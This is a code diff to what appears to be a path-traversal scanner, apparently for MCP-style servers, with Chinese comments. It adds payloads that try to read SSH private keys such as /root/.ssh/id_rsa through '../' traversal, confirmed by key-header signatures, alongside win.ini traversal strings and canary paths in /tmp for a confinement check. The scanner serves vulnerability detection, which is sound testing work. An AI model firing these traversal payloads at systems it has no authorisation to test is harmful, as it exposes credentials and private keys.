@@ -95,13 +95,34 @@ _PT_WIN = [
     "../../../../../../windows/win.ini",
     "....\\....\\....\\....\\windows\\win.ini",
 ]
+# 读目标扩充：SSH 私钥有极可靠且不会误命中的头签名，补一组读目标（inband 确认）。
+_PT_KEY_SIGS = ["BEGIN OPENSSH PRIVATE KEY", "BEGIN RSA PRIVATE KEY",
+                "BEGIN DSA PRIVATE KEY", "BEGIN EC PRIVATE KEY"]
+_PT_KEY = [
+    "/root/.ssh/id_rsa",
+    "../../../../../../root/.ssh/id_rsa",
+    "../../../../.ssh/id_rsa",
+]
+# 围栏差分（治“写型路径穿越”无内容回显 + “读固定文件/非 passwd”的越界判定）：
+# 越界路径（遍历 + 绝对），{TOKEN} 作唯一 canary 名（便于识别回显/写落点）。
+# 判定在 executor._path_confinement_ev：越界路径未被“围栏拒绝”→ 疑似未做路径限制。
+_PT_CONFINE = [
+    "/tmp/mcpf{TOKEN}",
+    "../../../../../../tmp/mcpf{TOKEN}",
+    "../../../../../../tmp/mcpf{TOKEN}.txt",
+]
 
 
 def _pt_battery() -> list[dict]:
     out = [{"value": v, "channel": "inband", "expect": list(_PT_PASSWD_SIGS), "control": None,
             "delay_target": 0.0, "technique": f"pt:passwd:{v[:16]}"} for v in _PT_PASSWD]
+    out += [{"value": v, "channel": "inband", "expect": list(_PT_KEY_SIGS), "control": None,
+             "delay_target": 0.0, "technique": f"pt:key:{v[:16]}"} for v in _PT_KEY]
     out += [{"value": v, "channel": "inband", "expect": list(_PT_WIN_SIGS), "control": None,
              "delay_target": 0.0, "technique": f"pt:win:{v[:16]}"} for v in _PT_WIN]
+    # 围栏差分放最后：确认型读（passwd/key 回显）优先返回 confirmed；无内容回显的写/读才靠它判疑似。
+    out += [{"value": v, "channel": "path_confine", "expect": None, "control": None,
+             "delay_target": 0.0, "technique": f"pt:confine:{v[:22]}"} for v in _PT_CONFINE]
     return out
 
 
